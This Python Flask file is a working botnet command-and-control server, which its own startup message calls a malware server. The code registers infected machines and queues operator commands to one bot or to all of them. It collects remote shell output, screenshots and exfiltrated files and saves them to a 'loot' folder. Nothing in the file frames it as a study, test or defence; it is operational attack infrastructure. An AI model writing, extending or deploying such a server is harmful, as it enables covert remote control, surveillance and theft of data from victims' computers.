from flask import Flask, jsonify, request
import os
import uuid
import base64
from datetime import datetime

app = Flask(__name__)

# Storage
bots = {} # bot_id: {info: ..., commands: [], results: []}
chat_history = []

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id', str(uuid.uuid4())[:8])
    ip = request.remote_addr
    
    bots[bot_id] = {
        "ip": ip,
        "hostname": data.get('hostname', 'Unknown'),
        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "commands": [],
        "results": []
    }
    
    alert = f"ALERT: Bot '{bot_id}' joined from {ip}"
    chat_history.append({"user": "SYSTEM", "message": alert, "role": "system"})
    print(alert)
    
    return jsonify({"status": "registered", "bot_id": bot_id})

@app.route('/poll/<bot_id>', methods=['GET'])
def poll(bot_id):
    if bot_id not in bots:
        return jsonify({"status": "error", "message": "Bot not registered"}), 404
    
    bots[bot_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if bots[bot_id]["commands"]:
        cmd = bots[bot_id]["commands"].pop(0)
        return jsonify(cmd)
    
    return jsonify({"status": "idle"})

@app.route('/report/<bot_id>', methods=['POST'])
def report(bot_id):
    if bot_id not in bots:
        return jsonify({"status": "error", "message": "Bot not registered"}), 404
    
    data = request.json
    result_type = data.get('type')
    content = data.get('content')
    
    if result_type == 'screenshot':
        # Decode base64 image and save
        try:
            img_data = base64.b64decode(content)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{bot_id}_{timestamp}.jpg"
            with open(filename, 'wb') as f:
                f.write(img_data)
            msg = f"Screenshot saved as {filename}"
        except Exception as e:
            msg = f"Error saving screenshot: {e}"
        chat_history.append({"user": bot_id, "message": msg, "role": "bot_res"})
        
    elif result_type == 'shell':
        chat_history.append({"user": bot_id, "message": f"Shell result:\n{content}", "role": "bot_res"})
        
    elif result_type == 'file_download':
        # Handle file data
        try:
            file_data = base64.b64decode(content)
            filename = f"downloaded_{bot_id}_{data.get('filename', 'file')}"
            with open(filename, 'wb') as f:
                f.write(file_data)
            msg = f"File saved as {filename}"
        except Exception as e:
            msg = f"Error saving file: {e}"
        chat_history.append({"user": bot_id, "message": msg, "role": "bot_res"})
    
    else:
        chat_history.append({"user": bot_id, "message": content, "role": "bot_res"})
        
    return jsonify({"status": "success"})

@app.route('/chat', methods=['GET', 'POST'])
def chat():
    if request.method == 'POST':
        data = request.json
        user = data.get('user', 'ADMIN')
        message = data.get('message', '')
        role = data.get('role', 'admin')
        
        chat_history.append({"user": user, "message": message, "role": role})
        
        # Check if message is a command for a bot
        # Format: /cmd <bot_id> <command> <args...>
        if message.startswith('/cmd '):
            parts = message.split(' ', 3)
            if len(parts) >= 3:
                target_bot = parts[1]
                cmd_type = parts[2]
                args = parts[3] if len(parts) > 3 else ""
                
                if target_bot in bots:
                    bots[target_bot]["commands"].append({
                        "id": str(uuid.uuid4())[:8],
                        "type": cmd_type,
                        "args": args
                    })
                    chat_history.append({"user": "SYSTEM", "message": f"Queued {cmd_type} for bot {target_bot}", "role": "system"})
                elif target_bot == 'all':
                    for b_id in bots:
                        bots[b_id]["commands"].append({
                            "id": str(uuid.uuid4())[:8],
                            "type": cmd_type,
                            "args": args
                        })
                    chat_history.append({"user": "SYSTEM", "message": f"Queued {cmd_type} for ALL bots", "role": "system"})
                else:
                    chat_history.append({"user": "SYSTEM", "message": f"Bot {target_bot} not found", "role": "system"})
        
        return jsonify({"status": "success"})
    
    return jsonify(chat_history)

@app.route('/admin/bots', methods=['GET'])
def get_bots():
    return jsonify(bots)

if __name__ == '__main__':
    print("Malware Flask Server starting on port 5000...")
    # Create a directory for downloads/screenshots if not exists
    if not os.path.exists('loot'):
        os.makedirs('loot')
    os.chdir('loot')
    app.run(host='0.0.0.0', port=10000)
